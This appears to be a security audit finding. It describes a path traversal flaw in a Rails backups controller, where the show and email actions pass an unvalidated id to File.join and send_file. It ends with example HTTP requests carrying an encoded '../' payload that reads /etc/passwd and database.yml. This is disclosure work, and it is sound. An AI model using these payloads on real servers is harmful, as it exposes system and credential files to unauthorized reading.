title: Path Traversal in BackupsController#show via unvalidated id parameter
analysis:
### Source
Untrusted user input enters through `params.fetch(:id)` in `Admin::BackupsController#show` (as well as `Admin::BackupsController#email`).

### Sanitization/Validation
In `Admin::BackupsController#show`, `params.fetch(:id)` is passed directly to `store.file(params.fetch(:id), include_download_source: true)`. When using `LocalBackupStore`, the file path is constructed via:
```ruby
def path_from_filename(filename)
  File.join(@base_directory, filename)
end
```
`File.join` does not prevent path traversal sequences (`../`) nor does it verify that the resolved path stays within `@base_directory`. While other actions in `Admin::BackupsController` (e.g. `check_backup_chunk`, `upload_backup_chunk`, `create_upload_url`) strictly validate the filename using `valid_filename?` (`/\A[a-zA-Z0-9\._\-]+\z/`), the `show` and `email` actions lack this check entirely.

### Sink
The resolved file path is passed to Rails' `send_file`:
```ruby
headers["Content-Length"] = File.size(backup.source).to_s
send_file backup.source
```
This reads and streams the target file from the server filesystem.

### Conceptual Exploit Payload
1. An administrator sends a request to initiate a backup download:
```http
POST /admin/backups/email.json HTTP/1.1
Host: discourse.example.com
Cookie: _forum_session=<admin_session>
Content-Type: application/x-www-form-urlencoded

id=..%2F..%2F..%2F..%2Fetc%2Fpasswd
```
2. The server verifies `store.file("..%2F..%2F..%2F..%2Fetc%2Fpasswd")` exists via `File.exist?` and dispatches an email containing the valid `EmailBackupToken`.
3. The administrator accesses the download URL using the received token:
```http
GET /admin/backups/show?id=..%2F..%2F..%2F..%2Fetc%2Fpasswd&token=<EMAIL_BACKUP_TOKEN> HTTP/1.1
Host: discourse.example.com
Cookie: _forum_session=<admin_session>
```
4. `LocalBackupStore#path_from_filename` traverses out of the backup directory and `send_file` streams `/etc/passwd` (or other sensitive host files such as `config/database.yml`).
